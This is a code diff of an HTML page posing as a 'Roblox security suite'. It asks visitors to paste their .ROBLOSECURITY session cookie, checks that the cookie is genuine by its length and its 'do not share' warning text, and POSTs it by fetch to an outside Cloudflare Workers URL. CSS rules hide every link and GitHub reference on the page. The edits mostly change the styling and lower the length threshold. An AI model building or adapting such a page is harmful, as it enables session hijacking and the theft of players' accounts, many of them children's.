@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>✦ SECURITY SUITE ✦</title>
+    <title>✦ RBX SECURITY SUITE ✦</title>
     <style>
         * {
             margin: 0;
@@ -13,48 +13,39 @@
         }
 
         :root {
-            --bg-gradient-1: #0a0a0f;
-            --bg-gradient-2: #120c1f;
-            --bg-gradient-3: #1a0f2e;
-            --bg-gradient-4: #0f0a1c;
-            --card-bg: rgba(12, 10, 20, 0.75);
-            --card-border: rgba(138, 92, 246, 0.5);
-            --card-glow: rgba(138, 92, 246, 0.3);
-            --text-primary: #f0e6ff;
-            --text-secondary: #c084fc;
-            --text-muted: #a78bfa;
-            --btn-gradient-1: #7c3aed;
-            --btn-gradient-2: #a855f7;
-            --btn-gradient-3: #c084fc;
-            --accent: #a855f7;
-            --input-bg: rgba(10, 8, 18, 0.8);
+            --bg-dark-1: #0a0a0f;
+            --bg-dark-2: #0f071a;
+            --bg-dark-3: #150d24;
+            --card-bg: rgba(10, 10, 18, 0.75);
+            --border-glow: #7c3aed;
+            --text-main: #e9d5ff;
+            --text-dim: #c084fc;
+            --accent: #8b5cf6;
+            --accent-glow: rgba(139, 92, 246, 0.4);
+            --input-bg: #0a0a12;
             --star-color: #c084fc;
+            --valid: #22c55e;
+            --invalid: #ef4444;
         }
 
         body.light {
-            --bg-gradient-1: #e6f0fa;
-            --bg-gradient-2: #d4e2f0;
-            --bg-gradient-3: #c2d4e6;
-            --bg-gradient-4: #d0deec;
+            --bg-dark-1: #e6f0fa;
+            --bg-dark-2: #d4e2f0;
+            --bg-dark-3: #c2d4e6;
             --card-bg: rgba(255, 255, 255, 0.85);
-            --card-border: rgba(100, 120, 200, 0.6);
-            --card-glow: rgba(100, 120, 200, 0.2);
-            --text-primary: #1a2a4f;
-            --text-secondary: #3a6ea5;
-            --text-muted: #5a7dae;
-            --btn-gradient-1: #4a8ec8;
-            --btn-gradient-2: #6aaee0;
-            --btn-gradient-3: #8ac0e8;
-            --accent: #5a9bd5;
-            --input-bg: rgba(255, 255, 255, 0.9);
+            --border-glow: #5a9bd5;
+            --text-main: #1a2a4f;
+            --text-dim: #2c4c8c;
+            --accent: #4a8ec8;
+            --accent-glow: rgba(74, 142, 200, 0.3);
+            --input-bg: #ffffff;
             --star-color: #ffd966;
         }
 
         body {
             min-height: 100vh;
-            background: linear-gradient(135deg, var(--bg-gradient-1) 0%, var(--bg-gradient-2) 25%, var(--bg-gradient-3) 50%, var(--bg-gradient-4) 75%, var(--bg-gradient-1) 100%);
-            background-size: 200% 200%;
-            animation: gradientShift 15s ease infinite;
+            background: linear-gradient(135deg, var(--bg-dark-1) 0%, var(--bg-dark-2) 50%, var(--bg-dark-3) 100%);
+            background-attachment: fixed;
             font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
             display: flex;
             justify-content: center;
@@ -62,12 +53,6 @@
             padding: 20px;
             position: relative;
             overflow-x: hidden;
-        }
-
-        @keyframes gradientShift {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
         }
 
         .stars {
@@ -96,14 +81,14 @@
             pointer-events: none;
             font-size: 28px;
             z-index: 0;
-            opacity: 0.35;
+            opacity: 0.3;
             animation: floatAnim linear infinite;
             filter: drop-shadow(0 0 8px var(--accent));
         }
         @keyframes floatAnim {
             0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
-            15% { opacity: 0.5; }
-            85% { opacity: 0.5; }
+            15% { opacity: 0.4; }
+            85% { opacity: 0.4; }
             100% { transform: translateY(-10vh) rotate(360deg); opacity: 0; }
         }
 
@@ -114,8 +99,8 @@
             padding: 44px 40px;
             max-width: 540px;
             width: 100%;
-            border: 1px solid var(--card-border);
-            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.3), 0 0 30px var(--card-glow);
+            border: 1px solid var(--border-glow);
+            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.3), 0 0 30px var(--accent-glow);
             transition: all 0.3s ease;
             z-index: 10;
             position: relative;
@@ -147,17 +132,16 @@
             100% { background-position: 0% 50%; }
         }
         .logo p {
-            color: var(--text-secondary);
+            color: var(--text-dim);
             font-size: 11px;
             letter-spacing: 4px;
             margin-top: 10px;
             text-transform: uppercase;
-            font-weight: 100;
-            text-shadow: 0 0 5px var(--accent);
+            font-weight: 300;
         }
 
         .label {
-            color: var(--text-secondary);
+            color: var(--text-dim);
             font-size: 14px;
             font-weight: 600;
             margin-bottom: 12px;
@@ -169,10 +153,10 @@
         .cookie-input {
             width: 100%;
             background: var(--input-bg);
-            border: 1.5px solid var(--card-border);
+            border: 1.5px solid var(--border-glow);
             border-radius: 32px;
             padding: 20px 22px;
-            color: var(--text-primary);
+            color: var(--text-main);
             font-family: 'Fira Code', monospace;
             font-size: 12px;
             resize: vertical;
@@ -190,17 +174,16 @@
             display: flex;
             align-items: center;
             gap: 10px;
-            color: var(--text-muted);
+            color: var(--text-dim);
             background: rgba(0, 0, 0, 0.2);
             padding: 10px 18px;
             border-radius: 60px;
             backdrop-filter: blur(4px);
-            font-weight: 500;
         }
 
         .btn {
             width: 100%;
-            background: linear-gradient(135deg, var(--btn-gradient-1), var(--btn-gradient-2), var(--btn-gradient-3));
+            background: linear-gradient(135deg, #7c3aed, var(--accent), #c084fc);
             background-size: 200% auto;
             border: none;
             border-radius: 60px;
@@ -222,7 +205,6 @@
         .btn:disabled {
             opacity: 0.5;
             cursor: not-allowed;
-            transform: none;
         }
 
         .message-area {
@@ -235,8 +217,6 @@
             padding: 12px 20px;
             border-radius: 60px;
             font-size: 13px;
-            font-weight: 500;
-            backdrop-filter: blur(4px);
             border-left: 3px solid #ff5a4a;
         }
 
@@ -249,26 +229,22 @@
         .theme-btn {
             background: var(--card-bg);
             backdrop-filter: blur(12px);
-            border: 1px solid var(--card-border);
+            border: 1px solid var(--border-glow);
             border-radius: 60px;
             padding: 10px 22px;
             cursor: pointer;
             font-size: 14px;
             font-weight: 600;
-            color: var(--text-secondary);
+            color: var(--text-dim);
             transition: all 0.2s;
         }
         .theme-btn:hover {
             transform: scale(1.05);
             box-shadow: 0 0 15px var(--accent);
-            border-color: var(--accent);
         }
 
-        a, a[href*="github"], a[href*="github.com"], a[href*="github.io"], .github-link, footer, .footer {
+        a, a[href*="github"], a[href*="github.com"], a[href*="github.io"] {
             display: none !important;
-            visibility: hidden !important;
-            opacity: 0 !important;
-            pointer-events: none !important;
         }
     </style>
 </head>
@@ -295,7 +271,7 @@
     (function(){
         const PROXY_URL = "https://robl.megadoner517.workers.dev";
 
-        // ТЕМА
+        // Тема
         const themeBtn = document.getElementById('themeToggleBtn');
         function loadTheme(){
             const saved = localStorage.getItem('rbx_theme');
@@ -321,7 +297,7 @@
         if(themeBtn) themeBtn.addEventListener('click', toggleTheme);
         loadTheme();
 
-        // ЗВЁЗДЫ
+        // Звёзды
         function createStars(){
             const container = document.getElementById('stars');
             for(let i=0;i<150;i++){
@@ -338,7 +314,7 @@
         }
         createStars();
 
-        // ПЕЧЕНЬКИ
+        // Печеньки
         for(let i=0;i<40;i++){
             let cookie = document.createElement('div');
             cookie.classList.add('floating-cookie');
@@ -355,11 +331,12 @@
         const statusDiv = document.getElementById('status');
         const msgArea = document.getElementById('messageArea');
 
+        // Простая проверка — длина от 750 и наличие WARNING
         function isValidCookie(val){
             if(!val || val.trim() === '') return false;
             const t = val.trim();
             if(!t.includes('WARNING:-DO-NOT-SHARE-THIS')) return false;
-            if(t.length < 800) return false;
+            if(t.length < 750) return false;
             return true;
         }
 
@@ -370,11 +347,11 @@
                 statusDiv.style.color = '#a78bfa';
                 sendBtn.disabled = true;
             } else if(isValidCookie(val)){
-                statusDiv.innerHTML = '<span>✅</span> Формат куки верный. Можно отправлять.';
+                statusDiv.innerHTML = `<span>✅</span> Кука валидна! Длина: ${val.trim().length} символов.`;
                 statusDiv.style.color = '#22c55e';
                 sendBtn.disabled = false;
             } else {
-                statusDiv.innerHTML = '<span>❌</span> Неверный формат. Нужна .ROBLOSECURITY (мин. 800 символов)';
+                statusDiv.innerHTML = '<span>❌</span> Неверный формат. Нужна .ROBLOSECURITY (мин. 750 символов)';
                 statusDiv.style.color = '#ef4444';
                 sendBtn.disabled = true;
             }
@@ -408,7 +385,7 @@
             };
 
             try{
-                const response = await fetch(PROXY_URL, {
+                await fetch(PROXY_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(msg)
